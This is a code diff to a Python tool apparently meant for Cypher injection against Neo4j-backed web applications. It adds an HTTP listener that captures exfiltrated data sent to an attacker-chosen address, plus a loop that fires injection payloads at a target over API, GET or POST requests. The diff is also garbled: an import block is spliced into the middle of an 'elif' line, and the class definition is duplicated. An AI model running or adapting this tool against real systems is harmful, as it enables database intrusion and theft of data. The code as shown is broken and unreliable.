@@ -30,6 +30,61 @@ class Neo4jInjector:
         if self.request_type == "API":
             url = self.target + self.parameters + encoded_payload
             data = None
+        elif self.request_type == "GET":import argparse
+import requests
+import urllib.parse
+import threading
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class RequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        # Log the incoming GET request path (which could contain the data)
+        print(f"Received data: {self.path}")
+        # Send a basic HTTP response
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(b"Received")
+    
+    # Suppress console logging of the HTTP server
+    def log_message(self, format, *args):
+        return
+
+def start_listener(port):
+    server_address = ('', port)
+    httpd = HTTPServer(server_address, RequestHandler)
+    print(f"Listening on port {port}...")
+    httpd.serve_forever()
+
+
+class Neo4jInjector:
+    def __init__(self, target, exfil_ip, request_type, parameters, cookie=None):
+        self.target = target
+        self.exfil_ip = exfil_ip
+        self.request_type = request_type
+        self.parameters = parameters
+        # Check if a cookie was provided and split it into a dictionary if so
+        self.cookie = {cookie.split('=')[0]: cookie.split('=')[1]} if cookie else None
+        self.headers = {
+            'User-Agent': 'curl/8.5.0',
+            'Content-Type': 'application/x-www-form-urlencoded',
+        }
+        self.proxies = {
+            'http': 'http://127.0.0.1:8080',
+        }
+
+    def inject_payload(self, payload):
+        injection_characters = ["-1", "'", "\""]
+        for injection_character in injection_characters:
+            full_payload = injection_character + payload
+            encoded_payload = urllib.parse.quote(full_payload, safe='')
+            url, data = self.prepare_request_data(encoded_payload)
+            self.execute_request(url, data)
+
+    def prepare_request_data(self, encoded_payload):
+        if self.request_type == "API":
+            url = self.target + self.parameters + encoded_payload
+            data = None
         elif self.request_type == "GET":
             url = f"{self.target}?{self.parameters}={encoded_payload}"
             data = None
@@ -71,7 +126,15 @@ def main():
     parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type: API/GET/POST")
     parser.add_argument("-p", "--parameters", required=True, help="Vulnerable parameters")
     parser.add_argument("-c", "--cookie", required=False, help="Optional cookie in format key=value")
+    parser.add_argument("--listen-port", required=True, type=int, help="Port for the listener to capture incoming data")
+
     args = parser.parse_args()
+
+
+    # Start the listener in a separate thread
+    listener_thread = threading.Thread(target=start_listener, args=(args.listen_port,))
+    listener_thread.daemon = True
+    listener_thread.start()
 
     injector = Neo4jInjector(args.url, args.exfil_ip, args.type, args.parameters, args.cookie)
 
